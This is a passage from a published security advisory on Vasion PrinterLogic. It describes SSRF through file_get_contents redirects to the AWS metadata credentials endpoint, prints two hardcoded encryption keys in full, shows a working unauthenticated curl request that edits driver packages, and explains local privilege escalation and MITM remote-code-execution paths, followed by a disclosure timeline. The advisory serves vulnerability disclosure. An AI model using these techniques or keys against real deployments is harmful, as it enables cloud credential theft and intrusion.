 <span style="color: #666666">24</span>     <span style="color: #19177C">$contents</span> <span style="color: #666666">=</span> <span style="color: #008000">file_get_contents</span>(<span style="color: #19177C">$url</span>);         <span style="color: #408080; font-style: italic">// SSRF #2</span>
 <span style="color: #666666">25</span> }
 <span style="color: #666666">26</span> 
 <span style="color: #666666">27</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #008000">mb_stripos</span>(<span style="color: #19177C">$contents</span>, <span style="color: #BA2121">&#39;Bundle ID&#39;</span>)){
 <span style="color: #666666">28</span>         <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&#39;Lexmark&#39;</span>;
 <span style="color: #666666">29</span> }   
</pre></div>

<p>An attacker with admin privileges in a tenant instance can likely compromise the SaaS infrastructure by reaching AWS metadata services and retrieve credentials corresponding to the cloud infrastructure.</p>
<p>Only an incomplete analysis was done due to the quantity of code.</p>
<p>It is recommended not to use the SaaS version and to not host the VA version in the cloud.</p>
<p><a id="va-insecure-use-file_get_contents"></a></p>
<h2>Details - Insecure use of file_get_contents() allowing to bypass security checks</h2>
<p>It was observed that the <code>console_release</code> directory contains PHP webpages with insecure code containing SSRF vulnerabilities.</p>
<p>The <code>file_get_contents()</code> function is used to retrieve http/https content. Unfortunately, this function will follow any redirection and is completely insecure when the remote server is controlled by an attacker.</p>
<p>For example:</p>
<pre><code>kali% cat /var/www/html/redirect.php
&lt;?php
header("Location: http://www.google.com/");
?&gt;
</code></pre>
<p>When this file is retrieved over HTTP, the result from the <code>file_get_contents()</code> function will contain the content of the www.google.com webpage. The <code>file_get_contents()</code> function followed transparently the redirection to www.google.com:</p>
<pre><code>kali% cat 1.php
&lt;?php

$url = "http://10.105.0.235/redirect.php";
$contents = file_get_contents($url); 
print $contents;

kali% php 1.php | head -n 10 | less
&lt;!doctype html&gt;&lt;html itemscope="" itemtype="http://schema.org/WebPage" lang="en-PH"&gt;&lt;head&gt;&lt;meta content="text/html; charset=UTF-8" http-equiv="Content-Type"&gt;&lt;meta content="/images/branding/googleg/1x/googleg_standard_color_128dp.png" itemprop="image"&gt;&lt;title&gt;Google&lt;/title&gt;&lt;script nonce="Y_AX2yiBXdblaOhbrR-Fig"&gt;(function(){var _g={kEI:'2DWdZfa3BpqWvr0P2bSamA4
[CONTENT-OF-GOOGLE.COM-WEBSITE]
</code></pre>
<p>An attacker with admin privileges can specify a malicious printer hostname corresponding to an attacker-controlled webserver/website. The PHP code implemented in PrinterLogic running in the VA version and in AWS in the SaaS version will follow the 301 redirection to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials</code> used by AWS to display security credentials.</p>
<p>There are 272 calls to the <code>file_get_contents()</code> function in the <code>printerlogic/pi</code> Docker instance:</p>
<pre><code>root@printerlogic:/home/debug# docker ps|grep printerlogic/pi
799ce8d8de5c   printerlogic/pi:5.0.8085-p2               "/var/www/app/.docke"   2 minutes ago    Up 2 minutes              80/tcp                                                                            printercloud_worker-pi-reports.1.gdbu4ya992n9s33h6c3cf4qn0
root@printerlogic:/home/debug# docker exec -it 799ce8d8de5c bash
root@799ce8d8de5c:/var/www/app# rgrep file_get_content . | wc -l
272
</code></pre>
<p>Some of these calls are insecure as shown previously.</p>
<p>An attacker with admin privileges in a tenant instance can likely compromise the SaaS infrastructure by reaching metadata services and retrieve credentials corresponding to the cloud infrastructure.</p>
<p>Only an incomplete analysis was done due to the quantity of code.</p>
<p>It is recommended not to use the SaaS version and to not host the VA version in the cloud.</p>
<p><a id="va-hardcoded-key"></a></p>
<h2>Details - Hardcoded keys used to encrypt information - insecure encryption</h2>
<p>It was observed that 2 hardcoded private keys can be found in the VA solution. These hardcoded keys are used to securely encrypt/decrypt data in the:</p>
<ul>
<li>SaaS version;</li>
<li>VA version.</li>
</ul>
<p>Since these keys are hardcoded, the encryption mechanism is insecure because these private keys are known.</p>
<p>These keys can be found in several Docker instances:</p>
<ul>
<li>printerlogic/pi</li>
<li>printerlogic/printer-admin-api</li>
</ul>
<p>Hardcoded keys inside the printercloud/pi Docker instance</p>
<pre>
printerlogic# docker exec -it 45901b1a9528 ls -la /var/www/app/config/    
total 256 
drwxrwxr-x 2 www-data www-data   4096 Oct 24 18:44 .
drwxr-xr-x 1 root     root       4096 Nov  7 22:25 ..
-rw-rw-r-- 1 www-data www-data 215556 Oct 24 18:43 cacert.pem
-rw-rw-r-- 1 www-data www-data   1122 Oct 24 18:43 driver-blacklist.yaml
<font color=red>-rw-rw-r-- 1 www-data www-data    243 Oct 24 18:43 keyfile.ppk.dev
-rw-rw-r-- 1 www-data www-data    128 Oct 24 18:43 keyfile.saasid.ppk.dev</font>
-rw-rw-r-- 1 www-data www-data    599 Oct 24 18:43 _ldapoverrides.php
-rw-rw-r-- 1 www-data www-data    152 Oct 24 18:43 opcache-blacklist.txt
-rw-rw-r-- 1 www-data www-data   1496 Oct 24 18:44 settings.php
-rw-rw-r-- 1 www-data www-data   1496 Oct 24 18:43 settings.php.local
-rw-rw-r-- 1 www-data www-data   1612 Oct 24 18:43 snmp_defaults.php
printerlogic# docker exec -it 45901b1a9528 cat /var/www/app/config/keyfile.ppk.dev
<font color=red>AAAAQQCYYU9zyn9V2Dem6kIA6SU9dZnqiZDM63WcP3ZDwnDY7nXwwlohdh6fE6jb
SRJ+DS2NEO+/9Idz4OW81fbTFxM9AAAAIQD4M/r+iMrKSA30cU2HwS7nerDpd0Ma
svm5b9NJVS1WuQAAACEAsDerrSCtAViPXFfHRcof1md1y68GjW94gXgGnkC7ntcA
AAAgaDv/Z7gPchc/hFUB4nI5NZ/QBqbom4Y7TBrbkxRLSuo=</font>
printerlogic# docker exec -it 45901b1a9528 cat /var/www/app/config/keyfile.saasid.ppk.dev
<font color=red>QypO2ShAW3V=pHtiBI8C1Lyj0/Unchb37JDqG8ZfvNX9vOMdL3QtXgr+XlvuVKN1Xq8TmBjahHLrLG+JbPlLqkEuuCsgFkt0fr3KG5u4j5=t2FZAlRyKhsLwmMDJUY3t</font>
</pre>

<p>In the SaaS version, the <code>/var/www/app/config/keyfile.saasid.ppk.dev</code> file will be used to encrypt/decrypt information.</p>
<p>The following <code>getEncryptedExternalId()</code> and <code>getDecryptedExternalId()</code> methods will use the <code>keyfile.saasid.ppk</code> key by default.</p>
<p>Content of <code>/var/www/app/app/Traits/SaasIdEncryption.php</code> inside the <code>printercloud/pi</code> Docker instance:</p>
<pre>
[...]
  3 namespace PrinterLogic\Traits;
  4 
  5 use Log;
  6 use Exception;
  7 use Throwable;
  8 
  9 /**
 10  * Knows how to encrypt and decrypt the SaasId (ExternalId). We use the
 11  * encrypted SaasId in some API calls to the Integrations Team.
 12  */
 13 trait SaasIdEncryption
 14 {
 15     use EncryptionFunctions;
 16 
 17     /**
 18      * Gets a sales force id and encrypts it for passing to the PrinterCloud Support site from
 19      * the My Account menu.
 20      *
 21      * @param string $external_id External SaasId that needs to be encrypted
 22      *
 23      * @return string
 24      */
 25     public function getEncryptedExternalId($external_id = null)
 26     {
 27         if (is_null($external_id)) {
 28             $external_id = $this->external_id;
 29         }
 30 
 31         try {
<font color=red> 32             $key = $this->getKey();</font>
 33             $iv = $this->createIv($key);
 34             $encryptedId = base64_encode(openssl_encrypt($external_id, 'AES-256-CBC', <font color=red>$key</font>, false, $iv));
 35         } catch (Throwable $e) {
 36             Log::error($e->getMessage());
 37             return '-';
 38         }
 39 
 40         Log::debug('Encrypted ID: `' . $encryptedId . '`');
 41 
 42         return $encryptedId;
 43     }
 44 
 45     /**
 46      * Returns Decrypted Id
 47      *
 48      * @param string $encrypted_id External SaasId that needs to be decrypted
 49      *
 50      * @return string
 51      */
 52     public function getDecryptedExternalId($encrypted_id = null)
 53     {
 54         if (is_null($encrypted_id)) {
 55             $encrypted_id = $this->external_id;
 56         }
 57 
 58         try {
<font color=red> 59             $key = $this->getKey();</font>
 60             $iv = $this->createIv($key);
 61             $encryptedId = openssl_decrypt($encrypted_id, 'AES-256-CBC', <font color=red>$key</font>, false, $iv);
 62         } catch (Throwable $e) {
 63             Log::error($e->getMessage());
 64             return '-';
 65         }
 66 
 67         Log::debug('Decrypted ID: `' . $encryptedId . '`');
 68 
 69         return $encryptedId;
 70     }
[...]
 95     /**
 96      * Returns a combined key from the supplied salt and given keyfile
 97      *
 98      * @param string $keyfile Path to the keyfile
 99      *
100      * @throws Exception
101      *
102      * @return string
103      */
<font color=red>104     public function getKey($keyfile = null)</font>
105     {
106         $KEYFILE_MIN_LEN = 128; //1024-bits
107 
108         /* Default */
109         if (empty($keyfile)) {
110             /*
111              * The user didn't specify one, so we try to find our default.
112              * If we can't find that, fallback to the dev version.
113              */
114             if (!defined('ABSPATH')) {
115                 define('ABSPATH', base_path() . '/');
116             }
117 
<font color=red>118             $keyfile = ABSPATH . 'config/keyfile.saasid.ppk'; //Default if we don't have one defined</font>
119 
120             if (!file_exists($keyfile)) {
121                 //fall back to a dev version
122                 $keyfile = $keyfile . '.dev';
123             }
124         }
</pre>

<p>The encryption mechanism is insecure. An attacker can decrypt sensitive information.</p>
<p><a id="va-edit-driver-packages-without-auth"></a></p>
<h2>Details - Unauthenticated webpage allowing to edit driver packages</h2>
<p>It was observed that the <code>/var/www/app/lib/dao/driver_version_update.php</code> webpage is reachable without authentication. This webpage allows an attacker to:</p>
<ul>
<li>List driver packages;</li>
<li>Get information regarding a specific driver package;</li>
<li>Change information on a specific driver package.</li>
</ul>
<p>The PHP code will update the information stored in the MySQL server when the driver package is edited (lines 92 to 110).</p>
<p>Content of <code>/var/www/app/lib/dao/driver_version_update.php</code>:</p>
<pre>
[...]
 12         header('Content-Transfer-Encoding: binary');
 13     header('Content-Type: application/octet-stream');
 14 
 15   $nologin=true;
 16 require_once("global.php");
 17 require_once(ABSPATH."lib/dao/dbopen.php");
 18 
 19       $package_needs_updating="(package_type = 'NORMAL'
 20 AND (
 21 (
 22 driver_version = ''
 23 )
 24 OR (
 25 driver_version = '0.0.0.1'
 26 )
 27 )
 28 AND (
 29 (
 30 driver_date = ''
 31 )
 32 OR (
 33 driver_date = '01/02/1980'
 34 )
 35 OR (
 36 driver_date = '01/01/1980'
 37 )
 38 ))";
 39 
<font color=red> 40   $cmd=requeststr("command","");
 41   if($cmd=="getlist") {</font>
 42         $da=new data_access();
 43         if(!$da->qry("SELECT ppp_driver_packages.id,inf_file, model_name, package_size, (
 44 SELECT sum( if(os_arch=32,1,0) ) 
 45 FROM ppp_drivers_os_support
 46 JOIN ppp_oses ON ( ppp_oses.id = ppp_drivers_os_support.os_id ) 
 47 WHERE driver_id = ppp_drivers.id
 48 ) AS x32, (
 49 
 50 SELECT sum( if(os_arch=64,1,0) ) 
 51 FROM ppp_drivers_os_support
 52 JOIN ppp_oses ON ( ppp_oses.id = ppp_drivers_os_support.os_id ) 
 53 WHERE driver_id = ppp_drivers.id
 54 ) AS x64
 55 FROM `ppp_driver_packages` 
 56 JOIN ppp_drivers ON ( driver_package_id = ppp_driver_packages.id ) 
 57 WHERE $package_needs_updating ")) {
 58           echo "Unable to retrieve update list: ".$da->last_error;
 59           return;
 60         }
 61     function q($s) {
 62         return '"'.str_replace('"','""',$s).'"';
 63     }
 64         $LE="\r\n";
 65         $rec=array();
 66         echo $da->result_count().$LE;
 67         while($da->next_row($rec)) {
 68           echo q($rec['id']).",".q($rec['inf_file']).",".q($rec['model_name']).",".q($rec['package_size']).",".q($rec['x32']).",".q($rec['x64']).$LE;
 69         }
 70 
<font color=red> 71   } else if($cmd=="getdriver") {</font>
 72 
 73         require_once(ABSPATH."lib/dao/driver_package_dao.php");
 74     $pdao=new driver_package_dao();
 75     $vo=new driver_package_vo();
 76     //we use this query here to avoid the need for the session variable and to add our where clause to make these routines generally do nothing and make no security hole
 77     $vo->id=requestint("package",-1);
 78         if(!$pdao->qry("select * from ppp_driver_packages left join ppp_driver_package_fragments on (ppp_driver_packages.id=ppp_driver_package_fragments.driver_package_id) where (id=$vo->id) and $package_need    s_updating order by driver_package_id,fragment"))
 79         {
 80                 echo $pdao->last_error;
 81                 return false;
 82         }
 83     if(!$pdao->next($vo)) {
 84         echo $pdao->last_error;
 85         return false;
 86     }
 87     header('Content-Length: '.$vo->int_package_size);
 88     flush();
 89         ini_set('max_execution_time','2400');
 90     $pdao->echo_blob($vo);
 91     return;
<font color=red> 92   } else if($cmd=="setversion") {
 93         $package_id=requestint("package",-1);
 94         $dd=requeststr("driverdate","01/01/1980");
 95         $dv=requeststr("driverversion","0.0.0.1");
 96         $pp=requeststr("printprocessor","");</font>
 97         $da=new data_access();
 98         $da->allow_write();
 99         $da->audit_handled();
100         if(!$da->qry("update ppp_driver_packages set ".
101            "driver_date=".$da->qescape($dd).",".
102        "driver_version=".$da->qescape($dv).",".
103            "print_processor=".$da->qescape($pp)." where                                                                                                                                         
104                 (id=$package_id) and $package_needs_updating                                                                                                                                    
105            ")) {                                                                                                                                                                                
106                         echo "Unable to set package data: ".$da->last_error;
107                         return;
108            }
109         if($da->affected_rows()==0) { echo "The driver could not be found or has already been updated."; return; }
110         echo $da->affected_rows();
111 
112   } else { echo "Unknown Command"; }
113 
114 ?>
</pre>

<p>Exemple of a request:</p>
<pre><code>kali% curl -v 'http://10.105.0.60/lib/dao/driver_version_update.php?command=setversion&amp;driverdate=01/01/2020&amp;driverversion=1.1.1.1&amp;package=3'
*   Trying 10.105.0.60:80...
* Connected to 10.105.0.60 (10.105.0.60) port 80
&gt; GET /lib/dao/driver_version_update.php?command=setversion&amp;driverdate=01/01/2020&amp;driverversion=1.1.1.1&amp;package=3 HTTP/1.1
&gt; Host: 10.105.0.60
&gt; User-Agent: curl/8.5.0
&gt; Accept: */*
&gt; 
&lt; HTTP/1.1 200 OK
&lt; Cache-Control: no-store, no-cache, must-revalidate
&lt; Cache-Control: post-check=0, pre-check=0
&lt; Content-Security-Policy: frame-ancestors 'self'
&lt; Content-Transfer-Encoding: binary
&lt; Content-Type: application/octet-stream
&lt; Date: Wed, 10 Jan 2024 12:00:38 GMT
&lt; Last-Modified: Wed, 10 Jan 2024 12:00:38 GMT
&lt; Pragma: no-cache
&lt; Server: nginx
&lt; X-Content-Type-Options: nosniff
&lt; X-Frame-Options: SAMEORIGIN
&lt; X-Xss-Protection: 1; mode=block
&lt; Transfer-Encoding: chunked
&lt; 
* Connection #0 to host 10.105.0.60 left intact
The driver could not be found or has already been updated.
</code></pre>
<p>An attacker can change information about any driver package.</p>
<h2>Vulnerabilities affecting the Windows client</h2>
<h3>Identification of the solution</h3>
<p>The version of the audited Windows PrinterLogic client is 21.1.0.658.</p>
<p><a id="win-lpe-03"></a></p>
<h2>Details - Local Privilege Escalation</h2>
<p>It was observed that the installation of drivers is done insecurely by storing temporary files as <code>NT AUTHORITY\SYSTEM</code> inside the <code>C:\Windows\Temp\data</code> directory.</p>
<p><code>C:\Windows\Temp\data</code> is a temporary directory that can be controlled by any user without admin privileges. Such directory cannot be trusted to store files that will be used by a program running as <code>NT AUTHORITY\SYSTEM</code>. Because of the insecure permissions, an attacker can replace any file with malicious ones in this directory or create a junction point from <code>C:\Windows\Temp\data</code> to anywhere in the file system.</p>
<p>Some files are created in the <code>C:\Windows\Temp\data</code> directory, as <code>NT AUTHORITY\SYSTEM</code> during the installation of drivers:</p>
<p>Windows Events
<img alt="" src="images/2025-vasion-report-2-win-lpe-01.png" /></p>
<p><a href="images/2025-vasion-report-2-win-lpe-01-full.png">Click here for full image</a></p>
<p>The package_8.dat file is blindly trusted while it can be replaced by a local attacker:</p>
<p>Windows Events
<img alt="" src="images/2025-vasion-report-2-win-lpe-02.png" /></p>
<p>Windows Events
<img alt="" src="images/2025-vasion-report-2-win-lpe-03.png" /></p>
<p>This file comes from an insecure rename of <code>C:\Windows\Temp\data\package_8.dat.cpytmp</code>. The <code>package_8.dat.cpytmp</code> file is downloaded as <code>NT AUTHORITY\SYSTEM</code> from the SaaS instance while installing a new driver.</p>
<p>Windows Events
<img alt="" src="images/2025-vasion-report-2-win-lpe-04.png" /></p>
<p>Since the directory <code>C:\Windows\Temp\data</code> is controlled by any local user, an attacker can replace <code>package_8.dat.cpytmp</code> and <code>package_8.dat</code> with malicious files during the installation process.</p>
<p>These vulnerabilities are surprising because, after the creation of these files, the directory <code>C:\Windows\PPP_TEMP</code> is securely used to install drivers.</p>
<p>An attacker can get Local Privilege Escalation.</p>
<p><a id="win-lpe-04"></a></p>
<h2>Details - Insecure option allowing an attacker to get Remote Code Execution against any client</h2>
<p>It was observed that the installation of the Windows PrinterLogic client inside organizations may enable an insecure option that will disable any SSL verification.</p>
<p>The Windows Registry Hive option <code>IgnoreCertificateFailures</code> can be set to <code>1</code> to ignore SSL verification. Since the access to <code>HKLM\SOFTWARE\PrinterLogic\PrinterInstaller\Overrides</code> requires admin privileges, it is more likely that admins will follow the official PrinterLogic documentation to disable SSL warnings.</p>
<p>Registry Hive
<img alt="" src="images/2025-vasion-report-2-ssl-01.png" /></p>
<p>From my experience, it appears that customers will follow the official PrinterLogic documentation at <a href="https://kb.printerlogic.com/s/article/Unable-to-upload-driver-Invalid-certificate">https://kb.printerlogic.com/s/article/Unable-to-upload-driver-Invalid-certificate</a> and <a href="https://kb.printerlogic.com/s/article/Certificate-errors-in-client-log-but-no-certificate-errors-in-browser">https://kb.printerlogic.com/s/article/Certificate-errors-in-client-log-but-no-certificate-errors-in-browser</a>.</p>
<p>This documentation recommends either to:</p>
<ul>
<li>Disable HTTPs and use HTTP instead; or</li>
<li>Disable any SSL verification - this insecure configuration allows an attacker to MITM the traffic and inject malicious drivers to remotely take over Windows machines using PrinterLogic.</li>
</ul>
<p><a href="https://kb.printerlogic.com/s/article/Unable-to-upload-driver-Invalid-certificate">https://kb.printerlogic.com/s/article/Unable-to-upload-driver-Invalid-certificate</a>
<img alt="" src="images/2025-vasion-report-2-ssl-02.png" /></p>
<p>An attacker can get Remote Code Execution against Windows machines by MITM-ing the HTTPS traffic and injecting malicious drivers.</p>
<p>A local attacker can get Local Privilege Escalation by creating a junction point and injecting a DLL in the HTTPS traffic of the Windows client. The resulting DLL will be created anywhere in the filesystem as NT AUTHORITY\SYSTEM.</p>
<p>The official PrinterLogic documentation recommends disabling security controls.</p>
<p>It is recommended to use secure defaults, as recommended by the NSA: <a href="https://www.cisa.gov/sites/default/files/2023-10/Shifting-the-Balance-of-Cybersecurity-Risk-Principles-and-Approaches-for-Secure-by-Design-Software.pdf">https://www.cisa.gov/sites/default/files/2023-10/Shifting-the-Balance-of-Cybersecurity-Risk-Principles-and-Approaches-for-Secure-by-Design-Software.pdf</a>.</p>
<p><a id="timeline"></a></p>
<h2>Report Timeline</h2>
<p>2021:</p>
<ul>
<li>Nov 2021: Security assessment performed on the PrinterLogic Windows client (a total of only 6 hours were allocated for this security assessment as PrinterLogic was not the main target of the security evaluation).</li>
<li>Dec 2021: Security assessment performed on the PrinterLogic MacOS/Linux client (a total of 3 working days were allocated for this security assessment).</li>
<li>Dec 2021: Reports sent to Vasion.</li>
</ul>
<p>2022:</p>
<ul>
<li>Jan 21, 2022: Zoom meeting with Vasion.</li>
<li>Feb 2022: Received access to a test SaaS instance of PrinterLogic.</li>
<li>Feb 2022: Security assessment performed on the PrinterLogic Va/SaaS version (a total of 15 working days were allocated for this security assessment).</li>
<li>Feb 17, 2022: Security assessment sent to Vasion.</li>
<li>Feb 18, 2022: Vasion acknowledged the reception of the security assessment.</li>
<li>Feb 28, 2022: Follow-up email sent to Vasion.</li>
<li>Feb 28, 2022: Vasion confirmed they would analyze the report.</li>
<li>Mar 3, 2022: Tested the latest macOS client (21.1.1.556) and confirmed that 2 vulnerabilities were still present. Reached Vasion with my findings.</li>
<li>Mar 3, 2022: Vasion acknowledged the reception of the updated analysis.</li>
<li>Mar 8, 2022: Vasion confirmed the 2 vulnerabilities were by-design.</li>
<li>May 9, 2022: Follow-up email sent to Vasion.</li>
<li>May 9, 2022: Vasion confirmed they were working on the security patches.</li>
<li>Jun 6, 2022: Tested the latest macOS client (25.1.0.574) and found bypasses in patched security vulnerabilities (LPE).</li>
<li>Jun 16, 2022: Follow-up email sent to Vasion.</li>
<li>Jun 17, 2022: Vasion confirmed that security patches for the MacOS clients were ongoing.</li>
<li>Sep 8, 2022: Vasion confirmed they were working on the security patches.</li>
<li>Oct 9, 2022: Asked Vasion to provide the current patch progress.</li>
<li>Oct 15, 2022: Vasion confirmed that security patches for the Windows client were already deployed and that the Va/SaaS vulnerabilities would be worked on.</li>
<li>Nov 9, 2022: Vasion provided additional information regarding security patches.</li>
<li>Dec 6, 2022: Follow-up email sent to Vasion.</li>
</ul>
<p>2023:</p>
<ul>
<li>Jan 10, 2023: Follow-up email sent to Vasion.</li>
<li>Jan 11, 2023: Vasion asked to sign a NDA for the VA/SaaS version.</li>
<li>Jan 13, 2023: Confirmed to Vasion that previous bypasses in patched security vulnerabilities in the MacOS client still worked.</li>
<li>Jan 14, 2023: Vasion confirmed they would check the MacOS vulnerabilities.</li>
<li>Jan 16, 2023: Vasion asked to sign a NDA for the VA/SaaS version.</li>
<li>Jan 19, 2023: Vasion confirmed that security patches for MacOS vulnerabilties were on-going.</li>
<li>Feb 1, 2023: Vasion confirmed that information regarding reported vulnerabilities in the VA/SaaS version would be provided only if a NDA is signed.</li>
<li>Feb 15, 2023: Vasion asked if the NDA was signed.</li>
<li>Mar 22, 2023: Confirmed to Vasion that a NDA could not be signed.</li>
<li>Mar 22, 2023: Vasion confirmed that they were reviewing the vulnerabilities and provided a listing of the vulnerabilities with the current progress.</li>
<li>Mar 22, 2023: Asked Vasion about the status of the vulnerabilities since 22 vulnerabilities were missing.</li>
<li>Mar 22, 2023: Vasion provided a CSV file listing the status of the vulnerabilities.</li>
<li>Mar 28, 2023: Vasion confirmed that tickets had been created for each vulnerability.</li>
<li>Apr 4, 2023: Follow-up email sent to Vasion regarding 2 missing vulnerabilities in CSV file.</li>
<li>May 10, 2023: Vasion confirmed that 1 issue was by-design and another was not exploitable.</li>
<li>May 11, 2023: Sent a remote exploit for the unexploitable vulnerability to Vasion.</li>
<li>May 11, 2023: Received an email from Vasion stating that a specific vulnerability was fixed.</li>
<li>May 11, 2023: Asked Vasion for diff files so I could check if vulnerabilities were fixed.</li>
<li>May 13, 2023: Vasion confirmed that 2 previous vulnerabilities were exploitable and were going to be fixed.</li>
<li>May 24, 2023: Vasions provided bullet lists of updated files without details.</li>
<li>Jun 1, 2023: Vasion confirmed that no diff files could be shared with customers because of Intellectual Property and asked me do to a dynamic analysis instead to verify whether the vulnerabilities were patched.</li>
<li>Jun 6, 2023: Vasion considered the previous vulnerability as fixed.</li>
<li>Jul 26, 2023: Vasion said that a specific vulnerability was still under review.</li>
<li>Oct 31, 2023: Follow-up email sent to Vasion.</li>
<li>Dec 15, 2023: Follow-up email sent to Vasion.</li>
</ul>
<p>2024:</p>
<ul>
<li>Jan 2024: Security assessment performed on the PrinterLogic Va/SaaS version (a total of 15 working days were allocated for this security assessment).</li>
<li>Jan 29, 2024: Sent a new security assessment to Vasion.</li>
<li>Jan 30, 2024: Vasion acknowledged the reception of the security assessment.</li>
<li>Feb 14, 2024: Vasion shared the analysis of the vulnerabilities reported in 2022 and 2024.</li>
<li>Feb 16, 2024: Asked Vasion on the remedation action schedule.</li>
<li>Apr 2, 2024: Asked Vasion when security patches would be available.</li>
<li>Apr 2, 2024: Vasion confirmed that 4 vulnerabilities were fixed and said that they could not provide an action schedule.</li>
<li>Sep 20, 2024: Sent an email to Vasion saying that I would publish a security advisory with all the reported vulnerabilities.</li>
<li>Sep 24, 2024: Vasion confirmed that all but 2 of the vulnerabilities reported in 2022 were fixed and that 13 vulnerabilities reported in 2024 were not yet fixed.</li>
<li>Sep 27, 2024: Follow-up email from Vasion.</li>
<li>Oct 2, 2024: Asked Vasion for a clear timeline for security patches and if they could provide security patches before the end of the year.</li>
<li>Oct 5, 2024: Vasion confirmed they could fix all the vulnerabilities before the end of the year.</li>
<li>Oct 9, 2024: Confirmed that I would publish a technical advisory in early 2025 and asked Vasion to keep me updated on the progress of the security patches.</li>
<li>Oct 10, 2024: Vasion confirmed they would regularly provide updates.</li>
<li>Oct 19, 2024: Vasion provided updates with current status.</li>
<li>Oct 21, 2024: Confirmed reception of the updates.</li>
<li>Nov 2, 2024: Vasion provided updates with current status.</li>
<li>Nov 5, 2024: Confirmed reception of the updates.</li>
<li>Nov 19, 2024: Vasion provided updates with current status.</li>
<li>Dec 17, 2024: Vasion provided updates with current status.</li>
<li>Dec 17, 2024: Confirmed reception of the updates showing that most of the vulnerabilites were fixed. Asked when security bulletins would be available.</li>
<li>Dec 17, 2024: Vasion said they would let me know when the security advisories would be published and asked me how I would like to be credited.</li>
<li>Dec 18, 2024: Asked Vasion to credit me ("Pierre Barre").</li>
<li>Dec 18, 2024: Vasion confirmed that the bulletins would be published on the week of Jan 20th.</li>
<li>Dec 21, 2024: Vasion asked me if January is fine for me.</li>
</ul>
<p>2025:</p>
<ul>
<li>Jan 2, 2025: Follow-up email from Vasion.</li>
<li>Jan 13, 2025: I confirmed that I planned to release a security advisory in February but since there were many technical details, it would take some time to work on the public security advisory. I also confirmed it would be fine for Vasion to release security bulletins on January 20th and then I would release security advisories later.</li>
<li>Jan 17, 2025: Vasion confirmed security bulletins were published.</li>
<li>Jan 20, 2025: Asked Vasion about (i) missing vulnerabilities in MacOS and Windows clients and (ii) CVEs.</li>
<li>Jan 22, 2025: Vasion sent (i) a corresponding list of security bulletins with the reported vulnerabilities, (ii) a list of vulnerabilities considered as features, and (iii) the confirmation that they submitted multiple requests to MITRE.</li>
<li>Feb 11, 2025: Replied to Vasion that I would edit the security advisory to remove some likely unexploitable vulnerabilities and issues considered as features.</li>
<li>Feb 13, 2025: Asked Vasion if they would want me to reach JPCERT to get CVEs since MITRE did not reply.</li>
<li>Feb 21, 2025: Follow-up email sent to Vasion.</li>
<li>Feb 21, 2025: Vasion confirmed it would be fine to reach JPCERT.</li>
<li>Feb 28, 2025: Reached JPCERT to get CVEs with Vasion CC-ed.</li>
<li>Mar 1, 2025: Reached Vasion regarding missing vulnerabilities in the Vasion security bulletins.</li>
<li>Mar 3, 2025: JPCERT said they would reach MITRE to understand why CVEs were not assigned.</li>
<li>Mar 3, 2025: Acknowledged the decision of JPCERT.</li>
<li>Mar 3, 2025: Vasion confirmed that all the reported vulnerabilities would have security bulletins.</li>
<li>Mar 6, 2025: Vasion provided another webpage listing additional security bulletins in Vasion Print.</li>
<li>Mar 6, 2025: JPCERT confirmed that some CVEs were assigned thanks to MITRE.</li>
<li>Mar 7, 2025: Email sent to Vasion providing CVEs and indicating that only 33 CVE IDs matched the vulnerabilities I reported.</li>
<li>Mar 10, 2025: Email sent to MITRE regarding missing CVEs.</li>
<li>Mar 12, 2025: Vasion provided a new Excel file with 7 findings needing bulletins, 3 unresolved findings and 12 disputed findings. The 12 disputed findings had corresponding explanations.</li>
<li>Mar 12, 2025: I provided my analysis to Vasion on the disputed findings, where I agreed on 3 issues being no security vulnerabilities and I disagreed on 9 issues incorrectly being considered as "features requests".</li>
<li>Mar 14, 2025: Follow-up email sent to MITRE.</li>
<li>Mar 18, 2025: Vasion provided the final analysis on the disputed findings.</li>
<li>Apr 8, 2025: A security advisory is published.</li>
</ul>
<h2>Credits</h2>
<p>These vulnerabilities were found by Pierre Barre aka Pierre Kim (<a href="https://twitter.com/PierreKimSec">@PierreKimSec</a>).</p>
<h2>References</h2>
<p><a href="https://pierrekim.github.io/blog/2025-04-08-vasion-printerlogic-83-vulnerabilities.html">https://pierrekim.github.io/blog/2025-04-08-vasion-printerlogic-83-vulnerabilities.html</a></p>
<p><a href="https://pierrekim.github.io/advisories/2025-vasion-printerlogic.txt">https://pierrekim.github.io/advisories/2025-vasion-printerlogic.txt</a></p>
<p><a href="https://help.printerlogic.com/va/Print/Security/Security-Bulletins.htm">https://help.printerlogic.com/va/Print/Security/Security-Bulletins.htm</a></p>
<p><a href="https://help.printerlogic.com/saas/Print/Security/Security-Bulletins.htm">https://help.printerlogic.com/saas/Print/Security/Security-Bulletins.htm</a></p>
<h2>Disclaimer</h2>
<p>This advisory is licensed under a Creative Commons Attribution Non-Commercial
Share-Alike 3.0 License: <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/">http://creativecommons.org/licenses/by-nc-sa/3.0/</a></p>
<p>The source code snippets in this security advisory are the intellectual property of Vasion and
used to explain the root causes of the vulnerabilities.</p>
    <div>
        <p class="text-muted">published on 2025-04-08 00:00:00 by Pierre Kim &lt;pierre.kim.sec@gmail.com&gt;</p>
    </div>
</div>

</div>
</body>
</html>